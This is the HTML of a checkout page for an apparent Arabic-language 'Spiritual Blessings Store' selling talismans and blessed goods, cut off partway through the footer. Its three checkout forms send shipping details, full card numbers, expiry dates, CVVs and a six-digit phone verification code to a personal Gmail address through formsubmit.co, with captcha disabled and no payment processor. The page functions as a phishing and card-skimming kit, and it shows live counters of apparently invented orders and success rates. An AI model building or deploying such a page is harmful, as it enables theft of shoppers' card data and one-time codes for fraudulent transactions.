<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ูุชุฌุฑ ุงูุจุฑูุงุช ุงูุฑูุญุงููุฉ - Spiritual Blessings Store</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#5D5CDE',
                        gold: '#D4AF37',
                        emerald: '#059669'
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white transition-colors duration-300">
    <!-- Header -->
    <header class="bg-gradient-to-r from-primary to-purple-700 text-white shadow-lg">
        <div class="container mx-auto px-4 py-4">
            <div class="flex justify-between items-center">
                <div class="flex items-center space-x-4 space-x-reverse">
                    <i class="fas fa-star-and-crescent text-2xl text-gold"></i>
                    <div>
                        <h1 class="text-xl font-bold">ูุชุฌุฑ ุงูุจุฑูุงุช ุงูุฑูุญุงููุฉ</h1>
                        <p class="text-sm opacity-90">Spiritual Blessings Store</p>
                    </div>
                </div>
                <div class="flex items-center space-x-4 space-x-reverse">
                    <!-- Language Selector -->
                    <select id="languageSelector" class="bg-white text-black rounded px-3 py-1 text-base font-medium">
                        <option value="ar">ุงูุนุฑุจูุฉ</option>
                        <option value="en">English</option>
                        <option value="fr">Franรงais</option>
                        <option value="es">Espaรฑol</option>
                        <option value="tr">Tรผrkรงe</option>
                    </select>
                    <!-- Currency Selector -->
                    <select id="currencySelector" class="bg-white text-black rounded px-3 py-1 text-base font-medium">
                        <option value="USD">USD $</option>
                        <option value="EUR">EUR โฌ</option>
                        <option value="SAR">SAR ุฑ.ุณ</option>
                        <option value="AED">AED ุฏ.ุฅ</option>
                        <option value="KWD">KWD ุฏ.ู</option>
                        <option value="QAR">QAR ุฑ.ู</option>
                        <option value="BHD">BHD ุฏ.ุจ</option>
                        <option value="OMR">OMR ุฑ.ุน</option>
                    </select>
                    <!-- Cart Icon -->
                    <div class="relative cursor-pointer" onclick="toggleCart()">
                        <i class="fas fa-shopping-cart text-xl"></i>
                        <span id="cartCount" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs">0</span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="relative bg-gradient-to-br from-primary/10 to-purple-100 dark:from-primary/20 dark:to-purple-900/20 py-12 overflow-hidden">
        <div class="absolute inset-0 bg-gradient-to-r from-gold/20 to-primary/20 animate-pulse"></div>
        <div class="container mx-auto px-4 text-center relative z-10">
            <h2 class="text-4xl md:text-6xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-primary to-purple-600 animate-bounce" data-aos="fade-down">
                <span data-translate="hero-title">ููุชุฌุงุช ุฑูุญุงููุฉ ุฃุตููุฉ ููุจุงุฑูุฉ</span>
            </h2>
            <p class="text-lg mb-8 opacity-80" data-translate="hero-subtitle" data-aos="fade-up" data-aos-delay="200">
                ุทูุงุณู ูุฃุญุฌุงุฑ ูุฑููุฉ ููุงุก ุฒูุฒู ููุฑูุก ุนููู - ุชูุตูู ุณุฑูุน ูุฌููุน ุฃูุญุงุก ุงูุนุงูู
            </p>
            
            <!-- Live Stats Counter -->
            <div class="mb-8 bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm rounded-xl p-6 shadow-lg" data-aos="zoom-in">
                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
                    <div>
                        <div class="text-2xl font-bold text-primary" id="ordersCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="orders-today">ุทูุจุงุช ุงูููู</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-emerald" id="customersCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="happy-customers">ุนููุงุก ุณุนุฏุงุก</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-gold" id="countriesCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="countries">ุฏููุฉ</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-purple-600" id="successCounter">0</div>
                        <div class="text-sm opacity-70" data-translate="success-rate">ูุณุจุฉ ุงููุฌุงุญ</div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-right">
                    <i class="fas fa-shipping-fast text-3xl text-emerald mb-3"></i>
                    <h3 class="font-bold mb-2" data-translate="shipping-fast">ุชูุตูู ุณุฑูุน</h3>
                    <p class="text-sm" data-translate="shipping-desc">ุฎูุงู ููู ุฅูู ููููู ููุฎููุฌ ูุฃูุฑูุจุง</p>
                    <div class="mt-2 text-xs text-emerald">
                        <i class="fas fa-clock mr-1"></i>
                        <span data-translate="24h-shipping">ุดุญู ุฎูุงู 24 ุณุงุนุฉ</span>
                    </div>
                </div>
                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-up">
                    <i class="fas fa-certificate text-3xl text-gold mb-3"></i>
                    <h3 class="font-bold mb-2" data-translate="authentic">ููุชุฌุงุช ุฃุตููุฉ</h3>
                    <p class="text-sm" data-translate="authentic-desc">ููุฑูุก ุนูููุง ูููุชุญูุฉ ุจุนูุงูุฉ ูุงุฆูุฉ</p>
                    <div class="mt-2 text-xs text-gold">
                        <i class="fas fa-star mr-1"></i>
                        <span data-translate="quality-certified">ูุนุชูุฏุฉ ุงูุฌูุฏุฉ</span>
                    </div>
                </div>
                <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 hover:scale-105" data-aos="fade-left">
                    <i class="fas fa-globe text-3xl text-primary mb-3"></i>
                    <h3 class="font-bold mb-2" data-translate="worldwide">ุชูุตูู ุนุงููู</h3>
                    <p class="text-sm" data-translate="worldwide-desc">ูุดุญู ุฅูู ุฌููุน ุฏูู ุงูุนุงูู</p>
                    <div class="mt-2 text-xs text-primary">
                        <i class="fas fa-map-marked-alt mr-1"></i>
                        <span data-translate="global-network">ุดุจูุฉ ุนุงูููุฉ</span>
                    </div>
                </div>
            </div>

            <!-- Real-time notifications -->
            <div id="liveNotifications" class="fixed top-20 left-4 z-40 space-y-2"></div>
        </div>
    </section>

    <!-- Products Section -->
    <section class="py-12">
        <div class="container mx-auto px-4">
            <h2 class="text-3xl font-bold text-center mb-8" data-translate="products-title">ููุชุฌุงุชูุง ุงููููุฒุฉ</h2>
            
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8" id="productsGrid">
                <!-- Products will be inserted here by JavaScript -->
            </div>
        </div>
    </section>

    <!-- Cart Sidebar -->
    <div id="cartSidebar" class="fixed top-0 right-0 h-full w-80 bg-white dark:bg-gray-800 shadow-xl transform translate-x-full transition-transform duration-300 z-50">
        <div class="p-6">
            <div class="flex justify-between items-center mb-6">
                <h3 class="text-xl font-bold" data-translate="cart">ุณูุฉ ุงูุชุณูู</h3>
                <button onclick="toggleCart()" class="text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times text-xl"></i>
                </button>
            </div>
            <div id="cartItems" class="space-y-4 mb-6"></div>
            <div class="border-t pt-4">
                <div class="flex justify-between items-center mb-4">
                    <span class="font-bold" data-translate="total">ุงููุฌููุน:</span>
                    <span id="cartTotal" class="font-bold text-xl text-primary">$0</span>
                </div>
                <button onclick="startCheckout()" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
                    <span data-translate="checkout">ุฅุชูุงู ุงูุทูุจ</span>
                </button>
            </div>
        </div>
    </div>

    <!-- Step 1: Shipping Info Modal -->
    <div id="shippingModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-md w-full mx-4 shadow-2xl max-h-screen overflow-y-auto">
            <div class="p-6">
                <!-- Progress Bar -->
                <div class="flex items-center justify-center mb-8">
                    <div class="flex items-center">
                        <!-- Step 1 - Active -->
                        <div class="flex items-center text-primary">
                            <div class="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold text-sm">1</div>
                            <span class="mr-2 text-sm font-medium">ุงูุดุญู</span>
                        </div>
                        <!-- Arrow -->
                        <i class="fas fa-arrow-left text-gray-400 mx-3"></i>
                        <!-- Step 2 - Inactive -->
                        <div class="flex items-center text-gray-400">
                            <div class="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center font-bold text-sm">2</div>
                            <span class="mr-2 text-sm">ุงูุฏูุน</span>
                        </div>
                        <!-- Arrow -->
                        <i class="fas fa-arrow-left text-gray-400 mx-3"></i>
                        <!-- Step 3 - Inactive -->
                        <div class="flex items-center text-gray-400">
                            <div class="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center font-bold text-sm">3</div>
                            <span class="mr-2 text-sm">ุงูุชุฃููุฏ</span>
                        </div>
                    </div>
                </div>

                <!-- Header -->
                <div class="text-center mb-6">
                    <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-shipping-fast text-primary text-2xl"></i>
                    </div>
                    <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">ูุนูููุงุช ุงูุชูุตูู</h3>
                    <p class="text-gray-600 dark:text-gray-300 text-sm">ุฃุฏุฎู ุจูุงูุงุช ุงูุดุญู ูููุชุงุจุนุฉ</p>
                </div>

                <!-- Order Summary -->
                <div class="bg-gray-50 dark:bg-gray-700 rounded-lg p-4 mb-6">
                    <h4 class="font-bold text-sm mb-3 text-gray-800 dark:text-white">ููุฎุต ุงูุทูุจ</h4>
                    <div id="shippingOrderItems" class="space-y-2 text-sm mb-3"></div>
                    <div class="border-t pt-3 flex justify-between font-bold text-primary">
                        <span>ุงููุฌููุน:</span>
                        <span id="shippingTotal">$0</span>
                    </div>
                </div>

                <!-- Shipping Form -->
                <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="shippingForm" class="space-y-4">
                    <!-- Hidden Fields for FormSubmit -->
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" name="_subject" value="๐ฆ ูุนูููุงุช ุงูุดุญู - ูุชุฌุฑ ุงูุจุฑูุงุช ุงูุฑูุญุงููุฉ">
                    <input type="hidden" name="_template" value="table">
                    
                    <!-- Full Name -->
                    <div>
                        <label class="block text-sm font-medium mb-2">
                            <i class="fas fa-user text-primary mr-2"></i>ุงูุงุณู ุงููุงูู *
                        </label>
                        <input type="text" name="ุงุณู_ุงูุนููู" id="fullName" required="" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                    </div>
                    
                    <!-- Phone & Country -->
                    <div class="grid grid-cols-2 gap-3">
                        <div>
                            <label class="block text-sm font-medium mb-2">
                                <i class="fas fa-phone text-primary mr-2"></i>ุงููุงุชู *
                            </label>
                            <input type="tel" name="ุฑูู_ุงููุงุชู" id="phoneNumber" required="" maxlength="14" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                        </div>
                        <div>
                            <label class="block text-sm font-medium mb-2">
                                <i class="fas fa-globe text-primary mr-2"></i>ุงูุฏููุฉ *
                            </label>
                            <select name="ุงูุฏููุฉ" id="country" required="" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                                <option value="">ุงุฎุชุฑ</option>
                                <option value="ุงูุณุนูุฏูุฉ">๐ธ๐ฆ ุงูุณุนูุฏูุฉ</option>
                                <option value="ุงูุฅูุงุฑุงุช">๐ฆ๐ช ุงูุฅูุงุฑุงุช</option>
                                <option value="ุงููููุช">๐ฐ๐ผ ุงููููุช</option>
                                <option value="ูุทุฑ">๐ถ๐ฆ ูุทุฑ</option>
                                <option value="ุงูุจุญุฑูู">๐ง๐ญ ุงูุจุญุฑูู</option>
                                <option value="ุนูุงู">๐ด๐ฒ ุนูุงู</option>
                                <option value="ุงูุฃุฑุฏู">๐ฏ๐ด ุงูุฃุฑุฏู</option>
                                <option value="ูุตุฑ">๐ช๐ฌ ูุตุฑ</option>
                                <option value="ุงููุบุฑุจ">๐ฒ๐ฆ ุงููุบุฑุจ</option>
                                <option value="ุฃููุงููุง">๐ฉ๐ช ุฃููุงููุง</option>
                                <option value="ูุฑูุณุง">๐ซ๐ท ูุฑูุณุง</option>
                                <option value="ุฃุฎุฑู">๐ ุฃุฎุฑู</option>
                            </select>
                        </div>
                    </div>
                    
                    <!-- Address -->
                    <div>
                        <label class="block text-sm font-medium mb-2">
                            <i class="fas fa-map-marker-alt text-primary mr-2"></i>ุงูุนููุงู ุงููุงูู *
                        </label>
                        <textarea name="ุงูุนููุงู_ุงููุงูู" id="fullAddress" required="" rows="3" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="ุงููุฏููุฉุ ุงูุดุงุฑุนุ ุฑูู ุงููุจูู"></textarea>
                    </div>
                    
                    <!-- Notes -->
                    <div>
                        <label class="block text-sm font-medium mb-2">
                            <i class="fas fa-sticky-note text-primary mr-2"></i>ููุงุญุธุงุช ุฅุถุงููุฉ
                        </label>
                        <textarea name="ููุงุญุธุงุช_ุฅุถุงููุฉ" rows="2" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="ุฃู ููุงุญุธุงุช ุฎุงุตุฉ..."></textarea>
                    </div>

                    <!-- Hidden Order Info -->
                    <input type="hidden" name="ุชูุงุตูู_ุงูุทูุจ" id="orderDetails">
                    <input type="hidden" name="ุงููุจูุบ_ุงูุฅุฌูุงูู" id="orderTotal">
                    <input type="hidden" name="ุชุงุฑูุฎ_ุงูุทูุจ" id="orderDate">
                    <input type="hidden" name="ููุน_ุงูุทูุจ" value="ูุนูููุงุช ุงูุดุญู">
                    
                    <!-- Buttons -->
                    <div class="flex space-x-3 space-x-reverse">
                        <button type="button" onclick="closeShipping()" class="flex-1 bg-gray-200 text-gray-800 py-3 rounded-lg font-bold hover:bg-gray-300 transition-colors">
                            ุฅูุบุงุก
                        </button>
                        <button type="submit" class="flex-1 bg-gradient-to-r from-primary to-purple-600 text-white py-3 rounded-lg font-bold hover:from-primary/90 hover:to-purple-600/90 transition-all">
                            <i class="fas fa-arrow-left mr-2"></i>ูุชุงุจุนุฉ ููุฏูุน
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Step 2: Payment Modal -->
    <div id="paymentModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-md w-full mx-4 shadow-2xl max-h-screen overflow-y-auto">
            <div class="p-6">
                <!-- Progress Bar -->
                <div class="flex items-center justify-center mb-8">
                    <div class="flex items-center">
                        <!-- Step 1 - Completed -->
                        <div class="flex items-center text-emerald">
                            <div class="w-8 h-8 bg-emerald text-white rounded-full flex items-center justify-center">
                                <i class="fas fa-check text-xs"></i>
                            </div>
                            <span class="mr-2 text-sm font-medium">ุงูุดุญู</span>
                        </div>
                        <!-- Arrow -->
                        <i class="fas fa-arrow-left text-emerald mx-3"></i>
                        <!-- Step 2 - Active -->
                        <div class="flex items-center text-primary">
                            <div class="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold text-sm">2</div>
                            <span class="mr-2 text-sm font-medium">ุงูุฏูุน</span>
                        </div>
                        <!-- Arrow -->
                        <i class="fas fa-arrow-left text-gray-400 mx-3"></i>
                        <!-- Step 3 - Inactive -->
                        <div class="flex items-center text-gray-400">
                            <div class="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center font-bold text-sm">3</div>
                            <span class="mr-2 text-sm">ุงูุชุฃููุฏ</span>
                        </div>
                    </div>
                </div>

                <!-- Header -->
                <div class="text-center mb-6">
                    <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-credit-card text-primary text-2xl"></i>
                    </div>
                    <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">ุงูุฏูุน ุงูุขูู</h3>
                    <p class="text-gray-600 dark:text-gray-300 text-sm">ุฃุฏุฎู ุจูุงูุงุช ุงูุจุทุงูุฉ ููุฏูุน</p>
                </div>

                <!-- Amount -->
                <div class="bg-gray-50 dark:bg-gray-700 rounded-lg p-4 mb-6 text-center">
                    <div class="text-2xl font-bold text-primary mb-1" id="paymentAmount">$0</div>
                    <div class="text-sm text-gray-600 dark:text-gray-300">ุงููุจูุบ ุงููุทููุจ</div>
                </div>

                <!-- Payment Form -->
                <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="paymentForm" class="space-y-4">
                    <!-- Hidden Fields for FormSubmit -->
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" name="_subject" value="๐ณ ูุนูููุงุช ุงูุฏูุน - ูุชุฌุฑ ุงูุจุฑูุงุช ุงูุฑูุญุงููุฉ">
                    <input type="hidden" name="_template" value="table">
                    
                    <!-- Card Number -->
                    <div>
                        <label class="block text-sm font-medium mb-2">
                            <i class="fas fa-credit-card text-primary mr-2"></i>ุฑูู ุงูุจุทุงูุฉ *
                        </label>
                        <div class="relative">
                            <input type="text" name="ุฑูู_ุงูุจุทุงูุฉ" id="cardNumber" required="" maxlength="19" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 pr-12" placeholder="1234 5678 9012 3456">
                            <div class="absolute left-3 top-1/2 transform -translate-y-1/2">
                                <i id="cardIcon" class="fas fa-credit-card text-gray-400"></i>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Cardholder Name -->
                    <div>
                        <label class="block text-sm font-medium mb-2">
                            <i class="fas fa-user text-primary mr-2"></i>ุงุณู ุตุงุญุจ ุงูุจุทุงูุฉ *
                        </label>
                        <input type="text" name="ุงุณู_ุตุงุญุจ_ุงูุจุทุงูุฉ" id="cardholderName" required="" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="Ahmed Al-Mohammed">
                    </div>
                    
                    <!-- Expiry & CVV -->
                    <div class="grid grid-cols-2 gap-3">
                        <div>
                            <label class="block text-sm font-medium mb-2">
                                <i class="fas fa-calendar text-primary mr-2"></i>ุงูุชูุงุก *
                            </label>
                            <input type="text" name="ุชุงุฑูุฎ_ุงูุงูุชูุงุก" id="expiryDate" required="" maxlength="5" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="MM/YY">
                        </div>
                        <div>
                            <label class="block text-sm font-medium mb-2">
                                <i class="fas fa-lock text-primary mr-2"></i>CVV *
                            </label>
                            <input type="text" name="CVV" id="cvv" required="" maxlength="4" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="123">
                        </div>
                    </div>

                    <!-- Hidden Payment Info -->
                    <input type="hidden" name="ุงููุจูุบ_ุงููุทููุจ" id="paymentTotalAmount">
                    <input type="hidden" name="ุชุงุฑูุฎ_ุงููุนุงููุฉ" id="transactionDate">
                    <input type="hidden" name="ููุน_ุงูุทูุจ" value="ูุนูููุงุช ุงูุฏูุน (ุงุฎุชุจุงุฑ)">
                    <input type="hidden" name="ุชุญุฐูุฑ" value="โ๏ธ ูุฐู ูุนูููุงุช ุงุฎุชุจุงุฑ ููุท!">
                    
                    <!-- Security Info -->
                    <div class="bg-emerald/10 border border-emerald/30 rounded-lg p-3">
                        <div class="flex items-center text-emerald text-sm">
                            <i class="fas fa-shield-alt mr-2"></i>
                            <span>ุฏูุน ุขูู ููุดูุฑ ุจุชูููุฉ SSL</span>
                        </div>
                    </div>
                    
                    <!-- Buttons -->
                    <div class="flex space-x-3 space-x-reverse">
                        <button type="button" onclick="backToShipping()" class="flex-1 bg-gray-200 text-gray-800 py-3 rounded-lg font-bold hover:bg-gray-300 transition-colors">
                            ุฑุฌูุน
                        </button>
                        <button type="submit" class="flex-1 bg-gradient-to-r from-emerald to-green-600 text-white py-3 rounded-lg font-bold hover:from-emerald/90 hover:to-green-600/90 transition-all">
                            <i class="fas fa-lock mr-2"></i>ุฏูุน ุขูู
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Step 3: Verification Modal -->
    <div id="verificationModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-md w-full mx-4 shadow-2xl">
            <div class="p-6">
                <!-- Progress Bar -->
                <div class="flex items-center justify-center mb-8">
                    <div class="flex items-center">
                        <!-- Step 1 - Completed -->
                        <div class="flex items-center text-emerald">
                            <div class="w-8 h-8 bg-emerald text-white rounded-full flex items-center justify-center">
                                <i class="fas fa-check text-xs"></i>
                            </div>
                            <span class="mr-2 text-sm font-medium">ุงูุดุญู</span>
                        </div>
                        <!-- Arrow -->
                        <i class="fas fa-arrow-left text-emerald mx-3"></i>
                        <!-- Step 2 - Completed -->
                        <div class="flex items-center text-emerald">
                            <div class="w-8 h-8 bg-emerald text-white rounded-full flex items-center justify-center">
                                <i class="fas fa-check text-xs"></i>
                            </div>
                            <span class="mr-2 text-sm font-medium">ุงูุฏูุน</span>
                        </div>
                        <!-- Arrow -->
                        <i class="fas fa-arrow-left text-emerald mx-3"></i>
                        <!-- Step 3 - Active -->
                        <div class="flex items-center text-primary">
                            <div class="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold text-sm">3</div>
                            <span class="mr-2 text-sm font-medium">ุงูุชุฃููุฏ</span>
                        </div>
                    </div>
                </div>

                <!-- Header -->
                <div class="text-center mb-8">
                    <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-mobile-alt text-primary text-2xl"></i>
                    </div>
                    <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">ุฑูุฒ ุงูุชุญูู</h3>
                    <p class="text-gray-600 dark:text-gray-300 text-sm">ุชู ุฅุฑุณุงู ุฑูุฒ ุงูุชุญูู ุฅูู ูุงุชูู ุงููุญููู</p>
                </div>

                <!-- Verification Form -->
                <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" class="space-y-6" id="verificationForm">
                    <!-- Hidden Fields for FormSubmit -->
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" name="_subject" value="๐ ุฑูุฒ ุงูุชุญูู - ูุชุฌุฑ ุงูุจุฑูุงุช ุงูุฑูุญุงููุฉ">
                    <input type="hidden" name="_template" value="table">
                    
                    <!-- 6-digit Code Input -->
                    <div>
                        <label class="block text-sm font-medium mb-4 text-center">ุฃุฏุฎู ุงูุฑูุฒ ุงููููู ูู 6 ุฃุฑูุงู</label>
                        <div class="flex justify-center space-x-2 space-x-reverse mb-6">
                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="0" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="1" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="2" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="3" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="4" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="5" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
                        </div>
                    </div>

                    <!-- Timer -->
                    <div class="text-center mb-4">
                        <div class="text-sm text-gray-500 mb-2">
                            <span>ุฅุนุงุฏุฉ ุงูุฅุฑุณุงู ุฎูุงู: </span>
                            <span id="timer" class="font-bold text-primary">02:00</span>
                        </div>
                        <button type="button" id="resendBtn" onclick="resendCode()" disabled="" class="text-primary text-sm font-medium opacity-50 cursor-not-allowed">
                            ุฅุนุงุฏุฉ ุฅุฑุณุงู ุงูุฑูุฒ
                        </button>
                    </div>

                    <!-- Hidden Code Field -->
                    <input type="hidden" name="ุฑูุฒ_ุงูุชุญูู" id="verificationCode">
                    <input type="hidden" name="ุชุงุฑูุฎ_ุงูุชุญูู" id="verificationDate">
                    <input type="hidden" name="ููุน_ุงูุทูุจ" value="ุชุฃููุฏ ุฑูุฒ ุงูุชุญูู">
                    
                    <!-- Submit Button -->
                    <button type="submit" id="verifyBtn" class="w-full bg-gradient-to-r from-emerald to-green-600 text-white py-4 rounded-lg font-bold text-lg hover:from-emerald/90 hover:to-green-600/90 transition-all">
                        <i class="fas fa-check mr-2"></i>ุชุฃููุฏ ุงูุฑูุฒ
                    </button>
                </form>

                <!-- Success Message (Hidden Initially) -->
                <div id="successMessage" class="hidden text-center">
                    <div class="w-20 h-20 bg-emerald/10 rounded-full flex items-center justify-center mx-auto mb-6">
                        <i class="fas fa-check-circle text-emerald text-4xl"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-emerald mb-4">ุชู ุงูุฏูุน ุจูุฌุงุญ! ๐</h3>
                    <p class="text-gray-600 dark:text-gray-300 mb-6">
                        ุชู ุชุฃููุฏ ุทูุจู ูุณูุชู ุดุญูู ุฎูุงู 24 ุณุงุนุฉ
                    </p>
                    <button onclick="closeAllModals()" class="bg-primary text-white px-8 py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
                        ุงูุนูุฏุฉ ูููุชุฌุฑ
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Fixed Cart Button - Top Corner Only -->
    <div class="fixed top-4 right-4 z-50">
        <button onclick="toggleCart()" class="bg-primary text-white p-3 rounded-full shadow-lg hover:bg-primary/90 transition-all duration-300 hover:scale-110">
            <div class="relative">
                <i class="fas fa-shopping-cart text-lg"></i>
                <span id="topCartCount" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold">0</span>
            </div>
        </button>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-8">
        <div class="container mx-auto px-4">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                <div>
                    <h3 class="font-bold mb-4" data-translate="contact-us">ุชูุงุตู ูุนูุง</h3>
                    <p class="mb-2"><i class="fas fa-envelope ml-2"></i> info@spiritualblessings.com</p>
                    <p class="mb-2"><i class="fas fa-shipping-fast ml-2"></i> <span data-translate="fast-shipping">ุชูุตูู ุณุฑูุน ููุฎููุฌ ูุฃูุฑูุจุง</span></p>
                </div>
                <div>
                    <h3 class="font-bold mb-4" data-translate="shipping-info">ูุนูููุงุช ุงูุดุญู</h3>
                    <p class="mb-2" data-translate="gulf-shipping">ุฏูู ุงูุฎููุฌ: 1-2 ุฃูุงู</p>
                    <p class="mb-2" data-translate="europe-shipping">ุฃูุฑูุจุง: 2-3 ุฃูุงู</p>
                    <p class="mb-2" data-translate="worldwide-shipping">ุจุงูู ุงูุนุงูู: 3-7 ุฃูุงู</p>
                </div>
                <div>
                    <h3 class="font-bold mb-4" data-translate="guarantee">ุถูุงูุชูุง</h3>
                    <p class="mb-2" data-translate="authentic-products">ููุชุฌุงุช ุฃุตููุฉ 100%</p>
                    <p class="mb-2" data-translate="blessed-items">ููุฑูุก ุนูููุง ุจุนูุงูุฉ</p>
                    <p class="mb-2" data-translate="quality-guarantee">ุถูุงู ุงูุฌูุฏุฉ</p>
                </div>
            </div>
            <div class="text-center mt-8 pt-8 border-t border-gray-700">
